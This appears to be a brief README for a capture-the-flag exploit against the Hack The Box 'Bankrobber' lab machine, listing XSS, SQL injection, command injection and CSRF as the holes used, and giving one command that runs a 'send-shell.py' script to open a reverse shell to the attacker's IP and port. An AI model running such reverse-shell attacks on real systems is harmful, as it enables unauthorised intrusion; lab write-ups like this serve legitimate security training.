# Bankrobber

[Bankrobber Machine](https://www.hackthebox.com/machines/bankrobber)

Identified Vulnerability:
- Cross Site Scripting (XSS)
- SQL Injection
- OS Command Injection
- Cross Site Request Forgery (CSRF)

Note: run it as sudo since using impacket-smbserver as root
```
sudo python3 send-shell.py -t bankrobber.htb -u ardias -p ardias -ip 10.10.14.9 -po 5555
```
